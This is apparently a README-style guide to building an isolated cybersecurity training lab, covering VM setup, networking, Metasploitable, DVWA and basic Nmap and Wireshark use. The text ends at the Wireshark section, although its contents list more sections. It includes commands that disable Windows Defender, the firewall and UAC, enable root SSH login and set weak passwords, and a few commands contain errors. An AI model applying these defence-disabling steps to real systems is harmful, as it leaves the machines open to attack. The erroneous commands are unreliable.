# Hands-On-Cybersecurity-Environment-Complete-Lab-Setup-Guide
A complete step-by-step guide to building an isolated hands-on cybersecurity lab using VirtualBox or VMware. Includes Kali Linux, Windows lab machine, Metasploitable, Active Directory, SOC monitoring, vulnerability scanning, web app testing, SIEM setup, and Red vs Blue team simulations for practical cybersecurity skill development.


# Complete Hands-On Cybersecurity Lab Environment Guide

## A Comprehensive Beginner-to-Advanced Practical Lab Setup Manual

---

**DISCLAIMER**: This guide is for **educational and ethical testing purposes only**. Always obtain proper authorization before testing any systems you do not own. Unauthorized access to computer systems is illegal and unethical.

---

## Table of Contents

1. [Objective of the Lab Environment](#1-objective-of-the-lab-environment)
2. [Hardware Requirements](#2-hardware-requirements)
3. [Virtualization Setup](#3-virtualization-setup)
4. [Network Topology Design](#4-network-topology-design)
5. [Step-by-Step Installation](#5-step-by-step-installation)
6. [Network Configuration](#6-network-configuration)
7. [Creating an Isolated Lab](#7-creating-an-isolated-lab)
8. [Installing and Configuring Tools](#8-installing-and-configuring-tools)
9. [Active Directory Lab Setup](#9-active-directory-lab-setup)
10. [Basic SOC Monitoring Lab](#10-basic-soc-monitoring-lab)
11. [Vulnerability Scanning Lab](#11-vulnerability-scanning-lab)
12. [Web Application Testing Lab](#12-web-application-testing-lab)
13. [Log Analysis Practice](#13-log-analysis-practice)
14. [Malware Analysis Basics Lab](#14-malware-analysis-basics-lab)
15. [Blue Team + Red Team Simulation Exercises](#15-blue-team--red-team-simulation-exercises)
16. [Weekly Learning Roadmap](#16-weekly-learning-roadmap)
17. [Practical Exercises](#17-practical-exercises)
18. [Mini Projects](#18-mini-projects)
19. [Capstone Project](#19-capstone-project)
20. [Recommended Free Resources](#20-recommended-free-resources)
21. [How to Document Findings Professionally](#21-how-to-document-findings-professionally)

---

## 1. Objective of the Lab Environment

### Purpose

The primary objective of this hands-on cybersecurity lab environment is to provide a safe, isolated, and realistic platform for:

- **Learning offensive security techniques** (Red Team)
- **Developing defensive security skills** (Blue Team)
- **Practicing incident response and forensics**
- **Understanding attack vectors and vulnerabilities**
- **Testing security tools in a controlled environment**
- **Preparing for industry certifications** (CEH, OSCP, Security+)

### Learning Objectives

By the end of this lab setup, you will be able to:

1. Set up a complete virtualization environment
2. Configure isolated networks for safe testing
3. Deploy multiple vulnerable target machines
4. Perform network reconnaissance and scanning
5. Exploit vulnerabilities using Metasploit
6. Conduct web application penetration testing
7. Monitor network traffic and detect threats
8. Analyze logs and identify indicators of compromise
9. Set up and manage Active Directory environments
10. Execute red team vs blue team exercises

### Lab Network Overview

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         INTERNET (Simulated)                            │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                    KALI LINUX (Attacker VM)                             │
│                 IP: 192.168.100.10/24                                   │
│   Tools: Nmap, Wireshark, Metasploit, Burp Suite, ZAP, etc.            │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                    ┌───────────────┼───────────────┐
                    │               │               │
                    ▼               ▼               ▼
        ┌───────────────────┐ ┌───────────────────┐ ┌───────────────────┐
        │   WINDOWS 10     │ │  METASPLOITABLE   │ │   UBUNTU SERVER  │
        │  (Target VM)     │ │      (Target)     │ │    (Target)       │
        │  192.168.100.20  │ │   192.168.100.30  │ │   192.168.100.40  │
        └───────────────────┘ └───────────────────┘ └───────────────────┘
                    │               │               │
                    └───────────────┼───────────────┘
                                    ▼
        ┌─────────────────────────────────────────────────────────────┐
        │              SPLUNK / ELK / SNORT VM                       │
        │              (Security Monitoring)                          │
        │              192.168.100.50                                 │
        └─────────────────────────────────────────────────────────────┘
```

---

## 2. Hardware Requirements

### Minimum Requirements (Low Budget Setup)

| Component | Minimum Specification | Recommended |
|-----------|----------------------|-------------|
| **CPU** | Intel Core i5-7th Gen or AMD Ryzen 5 | Intel Core i7-10th Gen or AMD Ryzen 7 |
| **RAM** | 8 GB DDR4 | 16 GB DDR4 or higher |
| **Storage** | 256 GB SSD | 512 GB NVMe SSD |
| **Network** | Gigabit Ethernet | Wi-Fi 6 / Ethernet |
| **Display** | 1920x1080 | 2560x1440 dual monitors |

### Budget Estimate

| Item | Budget Option ($) | Recommended ($) |
|------|------------------|-----------------|
| Laptop/Desktop | $400-600 | $800-1200 |
| RAM Upgrade (8→16GB) | $40-60 | Included |
| SSD Upgrade | $30-50 | Included |
| External HDD (backups) | $50-80 | $80-120 |
| **Total** | **$520-790** | **$880-1240** |

### Recommended System Specifications

**Primary Machine (Host)**:
- CPU: Intel Core i7/i9 or AMD Ryzen 7/9 (minimum 4 cores, 8 threads)
- RAM: 16 GB minimum (32 GB recommended)
- Storage: 500 GB SSD minimum
- OS: Windows 10/11, Linux (Ubuntu/Kali), or macOS

**Virtual Machine Resource Allocation**:

| VM | vCPUs | RAM | Storage | Purpose |
|----|-------|-----|---------|---------|
| Kali Linux | 2-4 | 4-8 GB | 50 GB | Attacker/Testing |
| Windows 10 | 2-4 | 4-8 GB | 60 GB | Target/Testing |
| Metasploitable | 1-2 | 1-2 GB | 20 GB | Vulnerable Target |
| Ubuntu Server | 2-4 | 4-8 GB | 40 GB | Target/Services |
| Security VM (ELK/Splunk) | 4-8 | 8-16 GB | 100 GB | Monitoring |

### Equipment Checklist

- [ ] Desktop/Laptop meeting minimum specs
- [ ] Reliable internet connection (broadband)
- [ ] USB flash drive (8 GB minimum for ISO installation)
- [ ] External storage for VM backups
- [ ] Notebook for documenting lab setup

---

## 3. Virtualization Setup

### VirtualBox Installation

#### Step 1: Download VirtualBox

**For Windows Hosts:**
```
powershell
# Open browser and navigate to:
https://www.virtualbox.org/wiki/Downloads

# Download VirtualBox 7.x.x for Windows hosts
# Run the installer with default settings
```

**For Linux Hosts (Ubuntu/Debian):**
```
bash
# Update package lists
sudo apt update && sudo apt upgrade -y

# Install required dependencies
sudo apt install -y curl wget gnome-terminal

# Add VirtualBox repository
echo "deb [arch=amd64] https://download.virtualbox.org/virtualbox/debian $(lsb_release -cs) contrib" | sudo tee /etc/apt/sources.list.d/virtualbox.list

# Download and add Oracle GPG key
wget -q https://www.virtualbox.org/download/oracle_vbox_2016.asc -O- | sudo apt-key add -
wget -q https://www.virtualbox.org/download/oracle_vbox.asc -O- | sudo apt-key add -

# Update and install VirtualBox
sudo apt update
sudo apt install -y virtualbox-7.0

# Start VirtualBox
virtualbox
```

**For macOS Hosts:**
```
bash
# Using Homebrew
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# Install VirtualBox
brew install --cask virtualbox

# Note: You may need to allow Kernel Extensions in macOS Security preferences
```

#### Step 2: Install VirtualBox Extension Pack

```
bash
# Download Extension Pack (must match VirtualBox version)
wget https://download.virtualbox.org/virtualbox/7.0.14/Oracle_VM_VirtualBox_Extension_Pack-7.0.14.vbox-extpack

# Open VirtualBox and go to:
# File > Preferences > Extensions > Add new package
# Select the downloaded extension pack
```

#### Step 3: VirtualBox Configuration

**Optimal Settings:**

1. Open VirtualBox → Preferences → General
   - Default Machine Folder: Set to a dedicated drive/folder with 200GB+ free space
   - Default Hard Disk Type: VDI (VirtualBox Disk Image)
   - Dynamically allocated storage

2. Preferences → Network → Host-only Networks
   - Click "Adds new host-only network"
   - Configure:
     
```
     IPv4 Address: 192.168.100.1
     IPv4 Network Mask: 255.255.255.0
     DHCP Server: Enable
     Address: 192.168.100.254
     Range: 192.168.100.2 - 192.168.100.254
     
```

3. Preferences → Proxy
   - Configure if behind corporate proxy

#### Common VirtualBox Errors and Troubleshooting

| Error | Cause | Solution |
|-------|-------|----------|
| VT-x/AMD-V not enabled | BIOS/UEFI setting disabled | Enable in BIOS: Security → Virtualization Technology |
| Nested virtualization fails | Hyper-V conflict (Windows) | Disable Hyper-V: `bcdedit /set hypervisorlaunchtype off` |
| USB device not detected | Extension pack missing | Install matching Extension Pack |
| VM won't start (Error 0x80004005) | Permission issues | Run VirtualBox as Administrator |
| 0% CPU in VM | Guest additions missing | Install VirtualBox Guest Additions |

### VMware Workstation/Player Installation

#### Download and Install

```
powershell
# VMware Workstation Pro (Trial/Paid)
# Download from: https://www.vmware.com/products/workstation-pro.html

# VMware Player (Free for personal use)
# Download from: https://www.vmware.com/products/workstation-player.html

# Installation steps:
1. Run installer
2. Accept license agreement
3. Choose installation path
4. Enable USB, Shared Folders, Auto Start features
5. Complete installation and restart
```

#### VMware Network Configuration

**Virtual Network Editor (Run as Administrator):**

```
VMnet0: Bridged - connects directly to physical network
VMnet1: Host-only - isolated network with host
VMnet2: NAT - shares host's IP (custom networks)
VMnet8: NAT - default NAT network
```

**Creating Custom Host-Only Network:**
```
1. Edit → Virtual Network Editor → Add Network
2. Select VMnet1 (Host-only)
3. Configure:
   - Subnet IP: 192.168.100.0
   - Subnet Mask: 255.255.255.0
4. Enable DHCP:
   - Starting IP: 192.168.100.128
   - Ending IP: 192.168.100.254
5. Save settings
```

### Comparison: VirtualBox vs VMware

| Feature | VirtualBox | VMware Workstation |
|---------|------------|-------------------|
| Cost | Free (GPL) | Paid ($149-250) |
| Performance | Good | Excellent |
| Snapshot Support | Excellent | Excellent |
| USB Passthrough | Good | Excellent |
| Nested Virtualization | Limited | Better |
| Cloud Integration | Limited | vSphere integration |
| **Recommendation** | Beginners/Budget | Professionals |

---

## 4. Network Topology Design

### Lab Network Architecture

#### Primary Network Segments

**1. Management Network (Host-Only)**
- Network: 192.168.100.0/24
- Purpose: Attacker Kali Linux to access all targets
- VMs: Kali Linux, All target VMs

**2. Isolated Lab Network**
- Network: 10.10.10.0/24
- Purpose: Separate network for vulnerable machines
- VMs: Metasploitable, Windows XP/7 targets

**3. Monitoring Network**
- Network: 192.168.200.0/24
- Purpose: Security tools and SIEM
- VMs: ELK Stack, Snort, Splunk

### Network Diagram (Detailed)

```
┌──────────────────────────────────────────────────────────────────────────┐
│                              HOST MACHINE                                 │
│                                                                          │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │                    VirtualBox / VMware                            │  │
│  │                                                                    │  │
│  │  ┌──────────────────┐        ┌──────────────────────────────────┐ │  │
│  │  │   Host-Only      │        │         Internal Network        │ │  │
│  │  │   Network        │        │         10.10.10.0/24           │ │  │
│  │  │   192.168.100.0/24│        │                                  │ │  │
│  │  │                  │        │  ┌────────────┐  ┌────────────┐  │ │  │
│  │  │  ┌─────────────┐ │        │  │Metasploitable│ │  Windows  │  │ │  │
│  │  │  │   Kali     │ │◄───────►│  │  10.10.10.20│ │    10     │  │ │  │
│  │  │  │ 192.168.100.10│ │        │  │             │ │10.10.10.30│  │ │  │
│  │  │  └─────────────┘ │        │  └────────────┘  └────────────┘  │ │  │
│  │  │                  │        │                                  │ │  │
│  │  │  ┌─────────────┐ │        │                                  │ │  │
│  │  │  │   Splunk   │ │◄───────►│                                  │ │  │
│  │  │  │192.168.100.50│ │        │                                  │ │  │
│  │  │  └─────────────┘ │        │                                  │ │  │
│  │  └──────────────────┘        └──────────────────────────────────┘ │  │
│  │                                                                    │  │
│  │  ┌──────────────────────────────────────────────────────────────┐│  │
│  │  │              Bridged Network (Internet Access)              ││  │
│  │  └──────────────────────────────────────────────────────────────┘│  │
│  └────────────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────────┘
```

### Network Configuration Summary

| VM | Network Adapter | IP Address | Subnet Mask | Gateway | Purpose |
|----|-----------------|------------|-------------|---------|---------|
| Kali Linux | Host-only | 192.168.100.10 | 255.255.255.0 | 192.168.100.1 | Attacker |
| Windows 10 | Host-only | 192.168.100.20 | 255.255.255.0 | 192.168.100.1 | Target |
| Metasploitable | Host-only | 192.168.100.30 | 255.255.255.0 | 192.168.100.1 | Vulnerable |
| Ubuntu Server | Host-only | 192.168.100.40 | 255.255.255.0 | 192.168.100.1 | Target |
| Splunk/ELK | Host-only | 192.168.100.50 | 255.255.255.0 | 192.168.100.1 | Monitoring |

---

## 5. Step-by-Step Installation

### 5.1 Kali Linux Installation

#### Download Kali Linux

```bash
# Navigate to Kali Linux downloads
https://www.kali.org/get-kali/

# Download options:
# 1. Kali Linux VirtualBox Image (Pre-built) - RECOMMENDED
# 2. Kali Linux ISO (Custom installation)

# For VirtualBox - Download pre-built VM:
wget https://images.kali.org/vm/kali-linux-2024.1-virtualbox-amd64.7z
```

#### Import Kali Linux VM (VirtualBox)

```
bash
# Extract the image
7z x kali-linux-2024.1-virtualbox-amd64.7z

# Open VirtualBox
# File > Import Appliance
# Select the .ova file
# Configure settings:
#   - CPU: 2-4 cores
#   - RAM: 4-8 GB
#   - Network: Host-only Adapter
# Click Import
```

#### Install Kali Linux from ISO (Manual Setup)

**Step 1: Create Virtual Machine**
```
1. VirtualBox → New
2. Name: Kali-Linux
3. Type: Linux
4. Version: Debian (64-bit)
5. Memory: 4-8 GB
6. Create virtual hard disk: 50 GB (Dynamic)
```

**Step 2: Configure VM Settings**
```
1. Settings → System
   - Processor: 2-4 CPUs
   - Enable PAE/NX
   - Enable nested paging

2. Settings → Network
   - Adapter 1: Host-only (vboxnet0)
   - Adapter 2: NAT (optional, for updates)

3. Settings → Storage
   - Add ISO to optical drive

4. Settings → Display
   - Video Memory: 128 MB
   - Enable 3D acceleration
```

**Step 3: Installation Process**

```
1. Start VM → Boot from ISO
2. Select "Graphical Install"
3. Language: English
4. Location: Your country
5. Keyboard: American English
6. Hostname: kali
7. Domain name: lab.local
8. Full name: Cybersecurity Lab
9. Username: labuser
10. Password: (create strong password)
11. Partition: Guided - Use entire disk
12. Install GRUB boot loader: Yes
13. Complete installation → Reboot
```

#### Post-Installation Kali Linux Setup

```
bash
# Login with credentials created during installation

# Update system
sudo apt update && sudo apt full-upgrade -y

# Install common tools (if not already installed)
sudo apt install -y nmap wireshark metasploit-framework burpsuite

# Install Python and dependencies
sudo apt install -y python3 python3-pip python3-venv

# Install Git
sudo apt install -y git

# Configure SSH
sudo systemctl enable ssh
sudo systemctl start ssh
sudo sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
sudo systemctl restart ssh

# Set static IP (optional)
sudo cat > /etc/network/interfaces.d/eth0 << 'EOF'
auto eth0
iface eth0 inet static
address 192.168.100.10
netmask 255.255.255.0
gateway 192.168.100.1
EOF

sudo systemctl restart networking
```

#### Common Errors and Troubleshooting

| Error | Solution |
|-------|----------|
| No network connectivity | Check VirtualBox network adapter settings |
| Unable to mount CD/DVD | Add Guest Additions ISO in Storage settings |
| Screen resolution issues | Install Guest Additions |
| DNS resolution fails | Edit /etc/resolv.conf with DNS servers |
| USB device not detected | Install Extension Pack, enable USB in VM settings |

#### Learning Objectives - Kali Linux

- [ ] Install and configure Kali Linux
- [ ] Navigate Kali Linux interface and tools
- [ ] Update and maintain Kali Linux
- [ ] Configure network connectivity
- [ ] Understand Kali Linux directory structure

---

### 5.2 Windows 10 (Vulnerable Lab Machine)

#### Download Windows 10 Evaluation

```
bash
# Download Windows 10 Enterprise Evaluation (180 days free)
https://www.microsoft.com/en-us/evalcenter/download-windows-10-enterprise

# Alternative: Download Windows 10 ISO
# https://www.microsoft.com/software-download/windows10ISO
```

#### Create Windows 10 VM

**VirtualBox Configuration:**
```
1. New → Windows 10 (64-bit)
2. Memory: 4-8 GB
3. Hard Disk: 60 GB (Dynamic)
4. Processor: 2-4 CPUs
5. Enable PAE/NX
6. Enable 3D acceleration (optional)
```

**Network Configuration:**
```
Settings → Network → Adapter 1
- Attached to: Host-only Adapter
- Name: vboxnet0
- Promiscuous Mode: Allow All
```

#### Windows 10 Installation Steps

```
1. Start VM with ISO mounted
2. Language: English → Click Next
3. Click "Install Now"
4. Enter product key (or skip for evaluation)
5. Select "Windows 10 Enterprise Evaluation"
6. Accept license terms
7. Custom: Install Windows only
8. Select drive → Next
9. Wait for installation (10-15 minutes)
10. Region: United States
11. Keyboard: US
12. Skip for now (Cortana, privacy settings)
13. Create local account: labuser / LabPass123!
14. Complete setup
```

#### Disable Windows Defender (Lab Environment)

```
powershell
# Open PowerShell as Administrator

# Disable Real-time protection
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable Windows Defender
Disable-WindowsOptionalFeature -Online -FeatureName Windows-Defender

# Disable Firewall (FOR LAB ONLY)
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Disable automatic updates
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f

# Disable UAC (for testing)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
```

#### Configure Static IP

```
powershell
# Open Network and Sharing Center
# Change adapter settings
# Right-click Ethernet → Properties
# Internet Protocol Version 4 (TCP/IPv4) → Properties
# Use the following IP address:
#   IP: 192.168.100.20
#   Subnet: 255.255.255.0
#   Gateway: 192.168.100.1
#   DNS: 8.8.8.8
```

#### Install Vulnerable Services (For Practice)

```
powershell
# Install IIS (Web Server)
dism /online /enable-feature /featurename:IIS-DefaultDocument
dism /online /enable-feature /featurename:IIS-HttpErrors
dism /online /enable-feature /featurename:IIS-StaticContent

# Install FileZilla Server (FTP)
# Download from: https://filezilla-project.org/download.php?type=server
# Run installer with default settings

# Enable Telnet
dism /online /enable-feature /featurename:TelnetServer
dism /online /enable-feature /featurename:TelnetClient
```

#### Common Errors

| Error | Solution |
|-------|----------|
| Installation stuck at 0% | Increase RAM allocation or disable ISO caching |
| No network adapter | Install VirtualBox Guest Additions |
| Slow performance | Allocate more RAM, reduce startup programs |
| Cannot connect to network | Verify Host-only adapter is active |

---

### 5.3 Metasploitable Installation

#### Download Metasploitable

```
bash
# Official Rapid7 Metasploitable
# Download from: https://information.rapid7.com/metasploitable-download.html

# Alternative: SourceForge
wget https://sourceforge.net/projects/metasploitable/files/Metasploitable3/metasploitable-linux-2.0.0.zip/download
```

#### Import Metasploitable (VirtualBox)

```
1. File > Import Appliance
2. Select metasploitable3-linux-2.0.0.ova
3. Configure:
   - RAM: 2 GB
   - CPU: 1-2
   - Network: Host-only
4. Import Appliance
```

#### Post-Installation Configuration

**Login Credentials:**
```
Username: msfadmin
Password: msfadmin
Root: sudo su (password: msfadmin)
```

**Configure Network:**
```
bash
# Login as msfadmin
sudo nano /etc/network/interfaces

# Configure static IP
auto eth0
iface eth0 inet static
address 192.168.100.30
netmask 255.255.255.0
gateway 192.168.100.1

# Restart networking
sudo /etc/init.d/networking restart
```

**Update System:**
```
bash
sudo apt update
sudo apt upgrade -y
sudo apt install -y nmap vim openssh-server
```

#### Metasploitable Services (Vulnerable by Design)

| Service | Port | Description |
|---------|------|-------------|
| FTP | 21 | Anonymous access enabled, vulnerable |
| SSH | 22 | Old version with vulnerabilities |
| Telnet | 23 | Unencrypted, brute-forceable |
| SMTP | 25 | VRFY command enabled |
| DNS | 53 | BIND version exposed |
| HTTP | 80 | Multiple web vulnerabilities |
| RPC | 111 | rpcbind vulnerabilities |
| MySQL | 3306 | Weak credentials |
| Rsync | 873 | Anonymous access |
| Samba | 445 | Multiple vulnerabilities |

#### Learning Objectives - Metasploitable

- [ ] Understand intentionally vulnerable services
- [ ] Practice enumeration techniques
- [ ] Exploit common vulnerabilities
- [ ] Use Metasploit framework effectively

---

### 5.4 Ubuntu Server Installation

#### Download Ubuntu Server

```
bash
# Download Ubuntu Server 22.04 LTS
wget https://releases.ubuntu.com/22.04/ubuntu-22.04.3-live-server-amd64.iso
```

#### Create Ubuntu Server VM

```
1. VirtualBox → New
2. Name: Ubuntu-Server
3. Type: Linux
4. Version: Ubuntu (64-bit)
5. Memory: 4-8 GB
6. Hard Disk: 40 GB
7. Processor: 2-4 CPUs
```

#### Installation Steps

```
1. Start VM with ISO
2. Select "Try or Install Ubuntu Server"
3. Choose English
4. Continue without updating
5. Network configuration:
   - Ethernet: ens33
   - Configure IP manually:
     Address: 192.168.100.40
     Netmask: 255.255.255.0
     Gateway: 192.168.100.1
     DNS: 8.8.8.8, 8.8.4.4
6. Mirror: Default
7. Storage: Use entire disk
8. Profile:
   Your name: Lab User
   Server name: ubuntu-server
   Username: labuser
   Password: LabPass123!
9. Install OpenSSH server: Yes
10. Featured Server Snaps: None
11. Complete installation → Reboot
```

#### Post-Installation Setup

```
bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install useful tools
sudo apt install -y net-tools nmap curl wget git vim

# Configure firewall
sudo ufw allow 22/tcp
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw enable

# Create test user (for vulnerable testing)
sudo useradd -m -s /bin/bash testuser
sudo echo "testuser:password123" | sudo chpasswd

# Set static IP (if not set during install)
sudo nano /etc/netplan/00-installer-config.yaml

# Edit to:
network:
  ethernets:
    ens33:
      addresses: [192.168.100.40/24]
      gateway4: 192.168.100.1
      nameservers:
        addresses: [8.8.8.8, 8.8.4.4]
  version: 2

sudo netplan apply
```

#### Install Vulnerable Web Application (DVWA)

```
bash
# Install LAMP stack
sudo apt install -y lamp-server^

# Install DVWA
cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git
sudo chmod -R 755 /var/www/html/DVWA
sudo cp /var/www/html/DVWA/config/config.inc.php.dist /var/www/html/DVWA/config/config.inc.php

# Configure MySQL
sudo mysql -u root -p
# (Set root password: rootpass)

CREATE DATABASE dvwa;
GRANT ALL PRIVILEGES ON dvwa.* TO 'root'@'localhost' IDENTIFIED BY 'rootpass';
FLUSH PRIVILEGES;
EXIT;

# Edit DVWA config
sudo nano /var/www/html/DVWA/config/config.inc.php
# Set: $_DVWA[ 'db_password' ] = 'rootpass';

# Access DVWA
# http://192.168.100.40/DVWA
# Default login: admin / password
```

#### Learning Objectives - Ubuntu Server

- [ ] Install and configure Ubuntu Server
- [ ] Manage services and firewall
- [ ] Set up vulnerable web applications
- [ ] Practice Linux administration

---

## 6. Network Configuration

### Network Adapter Types

| Adapter Type | Description | Use Case |
|--------------|-------------|----------|
| **NAT** | Shares host's IP address | Internet access for VMs |
| **Bridged** | Direct connection to physical network | External network access |
| **Host-only** | Isolated network with host | Safe lab environment |
| **Internal** | VM-to-VM only (no host) | Complete isolation |

### Configuring Networks in VirtualBox

#### Host-Only Network Setup

**Step 1: Create Host-Only Network**
```
1. VirtualBox → Preferences → Network
2. Click "Host-only Networks" tab
3. Click "+" to add new network
4. Configure:
   - Adapter: 
     IP Address: 192.168.100.1
     Network Mask: 255.255.255.0
   - DHCP Server:
     Enable Server: ✓
     Server Address: 192.168.100.254
     Server Mask: 255.255.255.0
     Lower Address Bound: 192.168.100.2
     Upper Address Bound: 192.168.100.254
5. Click OK
```

**Step 2: Configure VM Network Adapter**
```
1. Select VM → Settings → Network
2. Adapter 1:
   - Enable Network Adapter: ✓
   - Attached to: Host-only Adapter
   - Name: vboxnet0
   - Promiscuous Mode: Allow All
   - Cable Connected: ✓
3. Click OK
```

### Configuring Networks in VMware

#### Host-Only Network Setup

**Step 1: Open Virtual Network Editor**
```
1. Edit → Virtual Network Editor
2. Click "Change Settings" (requires admin)
3. Select "Host-only" network
4. Configure:
   - Subnet IP: 192.168.100.0
   - Subnet Mask: 255.255.255.0
5. Enable DHCP:
   - Starting IP: 192.168.100.128
   - Ending IP: 192.168.100.254
6. Apply → OK
```

**Step 2: Configure VM Network**
```
1. VM → Settings → Network Adapter
2. Network connection: Host-only
3. Customize: Select VMnet1
4. OK
```

### Testing Network Connectivity

**From Kali Linux:**
```
bash
# Test connectivity to all targets
ping 192.168.100.1    # Gateway
ping 192.168.100.20   # Windows
ping 192.168.100.30   # Metasploitable
ping 192.168.100.40   # Ubuntu

# Check network interfaces
ip addr show
ip route show

# Check DNS
nslookup google.com
cat /etc/resolv.conf
```

**Network Troubleshooting Commands:**
```
bash
# Check if service is listening
netstat -tulpn | grep LISTEN

# Check ARP table
arp -a

# Check DNS resolution
dig 192.168.100.30
host 192.168.100.30

# Trace route
traceroute 192.168.100.20

# Test specific port
nc -zv 192.168.100.30 80
telnet 192.168.100.30 22
```

### Common Network Issues

| Issue | Cause | Solution |
|-------|-------|----------|
| VMs can't ping each other | Firewall enabled | Disable firewall on all VMs |
| No internet in NAT | DNS not configured | Set DNS in /etc/resolv.conf |
| IP conflict | Duplicate IPs | Check IP allocation |
| Host-only not working | vboxnet0 not created | Recreate host-only network |
| Slow network | Adapter type mismatch | Use Host-only for lab |

---

## 7. Creating an Isolated Lab

### Why Isolation is Critical

**Purpose:**
- Prevent accidental damage to production networks
- Ensure legal compliance (ethical testing only)
- Create realistic attack scenarios
- Avoid detection by external security systems

### Isolation Best Practices

**Physical Isolation:**
- Dedicated hardware for lab (preferred)
- Separate network segment
- No connection to production networks

**Virtual Isolation:**
- Use Host-only or Internal networks
- Disable NAT adapters for vulnerable VMs
- Use separate physical adapter for bridged networking

### Network Segmentation

```
┌─────────────────────────────────────────────────────────────────┐
│                        PRODUCTION NETWORK                        │
│                        (DO NOT CONNECT)                          │
└─────────────────────────────────────────────────────────────────┘
                              │
                              │ (ISOLATION)
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                      LAB ENVIRONMENT                             │
│                                                                  │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │              Management Network (192.168.100.0/24)        │ │
│  │                                                           │ │
│  │  Attacker ◄──────────────────────────────────► Targets   │ │
│  │  (Kali)                                                 │ │
│  │                          │                              │ │
│  │                          ▼                              │ │
│  │                    Monitoring                             │ │
│  │                   (ELK/Splunk)                           │ │
│  └───────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────┘
```

### Implementing Isolation

#### VirtualBox Isolation

**Step 1: Disable Unnecessary Adapters**
```
For all target VMs:
Settings → Network → Uncheck "Cable Connected" for NAT/Bridged adapters
Keep only Host-only adapter
```

**Step 2: Create Firewall Rules on Host**
```
bash
# Windows (Run as Administrator)
# Block lab network from accessing internet
netsh advfirewall firewall add rule name="Block Lab to Internet" dir=out action=block remoteip=192.168.100.0/24

# Linux host
sudo iptables -A OUTPUT -d 192.168.100.0/24 -j DROP
```

**Step 3: Verify Isolation**
```
bash
# From Kali, verify NO internet access through lab network
ping 8.8.8.8  # Should work (NAT)
ping 192.168.100.30  # Should work (Host-only)

# From target VMs, verify NO external access
ping 8.8.8.8  # Should FAIL (isolated)
ping 192.168.100.10  # Should work (Kali)
```

### Safety Precautions

1. **Never connect lab to production networks**
2. **Use snapshots before testing exploits**
3. **Document all changes made to VMs**
4. **Regular backups of clean VM images**
5. **Use separate hardware if possible**
6. **Implement network filtering on host**
7. **Disable auto-start for vulnerable services**

### Lab Maintenance

**Regular Tasks:**
- Take snapshots after initial setup
- Test network connectivity weekly
- Update tools in Kali Linux
- Rotate log files in monitoring VMs
- Backup VM configurations

---

## 8. Installing and Configuring Tools

### 8.1 Nmap Installation and Usage

#### Installation

**Kali Linux (Pre-installed):**
```
bash
# Verify installation
nmap --version

# Update nmap
sudo apt update && sudo apt install nmap
```

**Ubuntu/Debian:**
```
bash
sudo apt install nmap
```

**Windows:**
```
powershell
# Using Chocolatey
choco install nmap

# Or download from: https://nmap.org/download.html
```

#### Basic Nmap Commands

```
bash
# Scan single host
nmap 192.168.100.30

# Scan multiple hosts
nmap 192.168.100.20 192.168.100.30 192.168.100.40

# Scan entire subnet
nmap 192.168.100.0/24

# Scan common ports
nmap -F 192.168.100.30

# Scan all ports
nmap -p- 192.168.100.30

# Service version detection
nmap -sV 192.168.100.30

# OS detection
nmap -O 192.168.100.30

# Aggressive scan (OS, version, script, traceroute)
nmap -A 192.168.100.30

# TCP SYN scan (requires root)
sudo nmap -sS 192.168.100.30

# UDP scan
sudo nmap -sU 192.168.100.30

# Output to file
nmap -oA scan_results 192.168.100.0/24
# -oN: Normal output
# -oX: XML output
# -oG: Grepable output

# Scan with scripts
nmap --script vuln 192.168.100.30
nmap --script http-title 192.168.100.30
nmap --script smb-enum-shares 192.168.100.30
```

#### Nmap Script Categories

| Category | Description |
|----------|-------------|
| auth | Authentication related |
| broadcast | Broadcast discovery |
| brute | Brute-force attacks |
| default | Default scripts |
| discovery | Service discovery |
| dos | Denial of service |
| exploit | Exploitation |
| external | External targets |
| fuzzer | Fuzzing |
| intrusive | Intrusive scripts |
| malware | Malware detection |
| safe | Safe scripts |
| version | Version detection |
| vuln | Vulnerability detection |

#### Practice Exercises

1. Scan Metasploitable and identify all open ports
2. Use Nmap to detect OS of Windows 10 target
3. Scan for specific vulnerabilities on Ubuntu Server
4. Perform a comprehensive scan of entire lab network

---

### 8.2 Wireshark Installation and Usage

#### Installation

**Kali Linux:**
```
bash
# Pre-installed in Kali
wireshark --version
```

**Ubuntu/Debian:**
```
bash
sudo apt install wireshark
# During installation, allow non-root users to capture packets
```

**Windows:**
```
powershell
# Using Chocolatey
choco install wireshark

# Or download from: https://www.wireshark.org/download.html
```

#### Basic Wireshark Usage

**Starting Wireshark:**
```
bash
# As root (Kali)
sudo wireshark

# Capture options
# Select network interface (eth0, ens33, etc.)
# Apply capture filter
# Click Start
```

**Capture Filters (BPF Syntax):**

| Filter | Description |
|--------|-------------|
| `host 192.168.100.30` | Traffic to/from specific host |
| `src host 192.168.100.30` | Traffic from specific source |
| `dst host 192.168.100.30` | Traffic to specific destination |
| `port 80` | HTTP traffic |
| `tcp port 80 or port 443` | HTTP/HTTPS traffic |
| `not broadcast` | Exclude broadcast |
| `icmp` | ICMP traffic only |
| `arp` | ARP traffic only |

**Display Filters:**

| Filter | Description |
|--------|-------------|
| `ip.addr == 192.168.100.30` | Filter by IP |
| `tcp.port == 80` | TCP port 80 |
| `http.request.method == "GET"` | HTTP GET requests |
| `http.response.code == 200` | HTTP 200 OK |
| `dns` | DNS traffic |
| `tcp.flags.syn == 1` | TCP SYN packets |
| `ssl` | SSL/TLS traffic |

